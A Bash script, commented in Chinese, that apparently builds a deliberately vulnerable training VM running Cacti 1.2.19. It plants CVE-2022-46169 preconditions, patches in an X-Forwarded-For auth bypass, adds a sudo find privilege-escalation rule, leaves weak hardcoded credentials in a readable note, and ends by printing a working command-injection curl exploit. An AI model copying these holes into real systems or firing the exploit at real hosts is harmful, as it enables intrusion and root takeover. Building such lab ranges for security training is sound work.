#!/bin/bash
# ============================================================
# VM-B2 (Internal) 一键部署 — Cacti 1.2.19 监控系统
# 用法: sudo bash deploy_b2.sh
# 前提: Ubuntu 22.04, 可连接互联网
# CVE: CVE-2022-46169 (预认证 RCE via remote_agent.php)
# ============================================================
set -e

echo "============================================"
echo " Scenario B — B2 (Internal) 一键部署"
echo " Cacti 1.2.19 + MariaDB + Apache"
echo " CVE-2022-46169 预认证 RCE"
echo "============================================"

if [ "$EUID" -ne 0 ]; then
    echo "[ERROR] 请用 sudo 运行: sudo bash $0"
    exit 1
fi

# ============ 1. 系统更新 ============
echo "[1/12] 更新系统..."
apt update && apt upgrade -y

# ============ 2. 安装软件包 ============
echo "[2/12] 安装 Apache + PHP + MariaDB + Cacti..."
DEBIAN_FRONTEND=noninteractive apt install -y \
    apache2 \
    mariadb-server mariadb-client \
    php8.1 php8.1-mysql php8.1-mbstring php8.1-xml php8.1-curl \
    php8.1-gd php8.1-ldap php8.1-bcmath php8.1-zip \
    php8.1-snmp php8.1-intl \
    snmp snmpd rrdtool \
    curl wget netcat-openbsd nmap vim openssh-server unzip \
    iptables-persistent

# ============ 3. 安装 Cacti 1.2.19 ============
echo "[3/12] 安装 Cacti 1.2.19..."
# Ubuntu 22.04 官方仓库自带 cacti 1.2.19
DEBIAN_FRONTEND=noninteractive apt install -y cacti cacti-spine 2>&1 | tail -3 || {
    echo "   [INFO] apt 安装失败, 手动下载..."
    wget -q "https://www.cacti.net/downloads/cacti-1.2.19.tar.gz" -O /tmp/cacti.tar.gz
    tar -xzf /tmp/cacti.tar.gz -C /tmp/
    mkdir -p /usr/share/cacti/site
    cp -r /tmp/cacti-1.2.19/* /usr/share/cacti/site/
    rm -rf /tmp/cacti-1.2.19 /tmp/cacti.tar.gz
}

[ -d /usr/share/cacti/site ] || mkdir -p /usr/share/cacti/site
echo "   [OK] Cacti 文件就位"

# ============ 4. MariaDB 配置 ============
echo "[4/12] 配置 MariaDB..."
systemctl enable mariadb --now

mysql -u root << 'SQLEOF'
CREATE DATABASE IF NOT EXISTS cacti CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER IF NOT EXISTS 'cacti'@'localhost' IDENTIFIED BY 'CCWLYho1iYzP';
GRANT ALL PRIVILEGES ON cacti.* TO 'cacti'@'localhost';
GRANT SELECT ON mysql.time_zone_name TO 'cacti'@'localhost';
FLUSH PRIVILEGES;
SQLEOF

# 导入 Cacti SQL 结构
if [ -f /usr/share/cacti/site/cacti.sql ]; then
    mysql -u root cacti < /usr/share/cacti/site/cacti.sql
elif [ -f /usr/share/doc/cacti/cacti.sql.gz ]; then
    zcat /usr/share/doc/cacti/cacti.sql.gz | mysql -u root cacti
else
    echo "   [WARN] 找不到 cacti.sql, 从官方包提取..."
    wget -q "https://www.cacti.net/downloads/cacti-1.2.19.tar.gz" -O /tmp/cacti2.tar.gz
    tar -xzf /tmp/cacti2.tar.gz -C /tmp/
    mysql -u root cacti < /tmp/cacti-1.2.19/cacti.sql 2>/dev/null || true
    rm -rf /tmp/cacti-1.2.19 /tmp/cacti2.tar.gz
fi
echo "   [OK] 数据库结构导入完成"

# ============ 5. Cacti config.php ============
echo "[5/12] 配置 Cacti config.php..."
cat > /usr/share/cacti/site/include/config.php << 'CONFEOF'
<?php
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cacti';
$database_password = 'CCWLYho1iYzP';
$database_port     = '3306';
$database_ssl      = false;

$poller_id = 1;
$url_path = '/cacti/';

$config['poller_id'] = 1;
$config['connection'] = 'online';
CONFEOF

# ============ 6. Admin 密码 (bcrypt) ============
echo "[6/12] 设置 Admin 密码 admin/admin123 (bcrypt)..."
php << 'PHPEOL' 2>/dev/null
<?php
$hash = password_hash('admin123', PASSWORD_DEFAULT);
$mysqli = new mysqli('localhost', 'cacti', 'CCWLYho1iYzP', 'cacti');
if ($mysqli->connect_error) die("DB error: " . $mysqli->connect_error);
$stmt = $mysqli->prepare("INSERT INTO user_auth (username, password, realm, must_change_password, enabled)
    VALUES ('admin', ?, 0, '', 'on')
    ON DUPLICATE KEY UPDATE password = VALUES(password), enabled = 'on'");
$stmt->bind_param('s', $hash);
$stmt->execute();
echo "   [OK] admin/admin123 (bcrypt) 已写入 user_auth 表\n";
PHPEOL

# ============ 7. Poller 表 (CVE 利用前提) ============
echo "[7/12] 配置 Poller 表 (CVE-2022-46169 利用前提)..."
mysql -u cacti -p'CCWLYho1iYzP' cacti << 'SQLEOF2'
-- poller #2: hostname=127.0.0.1, X-Forwarded-For 绕过认证
INSERT INTO poller (id, hostname, status, disabled)
VALUES (2, '127.0.0.1', 1, '')
ON DUPLICATE KEY UPDATE hostname = '127.0.0.1', status = 1, disabled = '';

-- poller_item: action=2 (POLLER_ACTION_SCRIPT_PHP) 触发 proc_open 命令注入
INSERT INTO poller_item (local_data_id, poller_id, host_id, action, rrd_name, rrd_path)
VALUES (1, 1, 1, 2, 'traffic_in', '/var/lib/cacti/rra/1/1.rrd')
ON DUPLICATE KEY UPDATE action = 2;

-- data_local: poller_item 依赖
INSERT INTO data_local (id, data_template_id, host_id)
VALUES (1, 1, 1)
ON DUPLICATE KEY UPDATE host_id = 1;

-- 版本号 (防止自动跳转 /install/)
UPDATE version SET cacti = '1.2.19';
SQLEOF2
echo "   [OK] Poller 表配置完成"

# ============ 8. 修复 CVE 关键问题 ============
echo "[8/12] 修复 CVE 利用关键问题..."

# 8a: 版本文件 (与 DB 一致, 防止 auth.php 跳转 install)
echo -n "1.2.19" > /usr/share/cacti/site/include/cacti_version
echo "   [OK] cacti_version = 1.2.19"

# 8b: 修复 get_client_addr() 的 break bug
# 问题: 内层 foreach 的 break 无法跳出外层循环
#       导致 REMOTE_ADDR 总是覆盖 X-Forwarded-For 的 IP
# 修复: break → break 2
echo "   修复 functions.php: break -> break 2..."
php << 'PHPFIX'
<?php
$file = '/usr/share/cacti/site/lib/functions.php';
if (!file_exists($file)) {
    echo "   [WARN] functions.php 不存在, 跳过\n";
    exit(0);
}
$lines = file($file);
$in_func = false;
$fixed = false;
for ($i = 0; $i < count($lines); $i++) {
    // 进入 get_client_addr 函数
    if (preg_match('/function\s+get_client_addr/', $lines[$i])) {
        $in_func = true;
        continue;
    }
    if ($in_func) {
        // 在函数体内找到第一个独立的 break; 语句, 改为 break 2;
        if (preg_match('/^\s+break;\s*$/', $lines[$i])) {
            $lines[$i] = preg_replace('/break;/', 'break 2;', $lines[$i], 1);
            $fixed = true;
            break;
        }
        // 如果遇到另一个 function 定义, 说明离开了函数范围
        if (preg_match('/^\s*function\s+/', $lines[$i])) {
            break;
        }
    }
}
if ($fixed) {
    file_put_contents($file, implode('', $lines));
    echo "   [OK] get_client_addr() break -> break 2 已修复\n";
} else {
    echo "   [WARN] 未找到 break; 语句, 可能已修复或格式不同\n";
}
PHPFIX

# ============ 9. Apache 配置 ============
echo "[9/12] 配置 Apache..."

# 主 VirtualHost: 根路径重定向到 /cacti/
cat > /etc/apache2/sites-available/cacti.conf << 'APACHEOF'
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html
    RedirectMatch ^/$ /cacti/
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
APACHEOF

# Cacti alias
cat > /etc/apache2/conf-available/cacti.conf << 'CACTIAPH'
Alias /cacti /usr/share/cacti/site
<Directory /usr/share/cacti/site>
    Options +FollowSymLinks
    AllowOverride All
    Require all granted
    <IfModule mod_php.c>
        php_value date.timezone Asia/Shanghai
        php_value max_execution_time 300
        php_value memory_limit 256M
    </IfModule>
</Directory>
CACTIAPH

a2enmod rewrite php8.1 2>/dev/null || true
a2dissite 000-default 2>/dev/null || true
a2ensite cacti 2>/dev/null || true
a2enconf cacti 2>/dev/null || true
systemctl restart apache2
systemctl enable apache2
echo "   [OK] Apache 配置完成"

# ============ 10. sudo find 提权 (B-8) ============
echo "[10/12] 配置提权向量..."
cat > /etc/sudoers.d/www-data-find << 'SUDOEOF'
www-data ALL=(root) NOPASSWD: /usr/bin/find
SUDOEOF
chmod 440 /etc/sudoers.d/www-data-find

# ============ 11. 环境信息 ============
echo "[11/12] 创建运维文件..."
useradd -m -s /bin/bash operator 2>/dev/null || true
echo 'operator:0p3rat0r@GDJ' | chpasswd
usermod -aG sudo operator 2>/dev/null || true

mkdir -p /opt/ops
cat > /opt/ops/deploy_note.txt << 'OPSEOF'
===== 广电监控系统部署备忘 (内部服务器) =====
日期: 2024-03-15

服务:
  - Cacti 1.2.19 监控系统
  - MariaDB 数据库
  - Apache2 Web 服务

数据库信息:
  库名: cacti  用户: cacti  密码: CCWLYho1iYzP

访问方式:
  Web: http://<内网IP>/cacti/
  SSH: operator / 0p3rat0r@GDJ
OPSEOF
chmod 644 /opt/ops/deploy_note.txt

# ============ 12. 防火墙和收尾 ============
echo "[12/12] 配置防火墙..."

iptables -F
iptables -P INPUT DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -s 192.168.110.1 -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -s 192.168.110.0/24 -j ACCEPT
iptables -A INPUT -s 127.0.0.0/8 -j ACCEPT
iptables -A INPUT -p icmp -j ACCEPT

mkdir -p /etc/iptables
iptables-save > /etc/iptables/rules.v4
systemctl enable netfilter-persistent 2>/dev/null || true

sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null || true
systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null || true

rm -rf /tmp/*
history -c

echo ""
echo "============================================"
echo "  [OK] B2 (Internal) 部署完成!"
echo "============================================"
echo "  Cacti:    http://<IP>/cacti/"
echo "            (访问 / 自动重定向到 /cacti/)"
echo "  Login:    admin / admin123"
echo "  Operator: operator / 0p3rat0r@GDJ"
echo "============================================"
echo ""
echo "攻击链 (B2):"
echo "  B-4: 横向移动 B1 -> B2"
echo "  B-5: CVE-2022-46169 预认证 RCE"
echo "  B-6: Cacti DB 凭据 cacti/CCWLYho1iYzP"
echo "  B-8: sudo find 提权"
echo ""
echo "CVE 验证命令:"
echo "  curl -X POST http://IP/cacti/remote_agent.php \\"
echo "    -H 'X-Forwarded-For: 127.0.0.1' \\"
echo "    -d 'action=polldata&poller_id=;whoami>/dev/shm/.p&host_id=1&local_data_ids[]=1'"
echo "  cat /dev/shm/.p    # 输出: www-data"
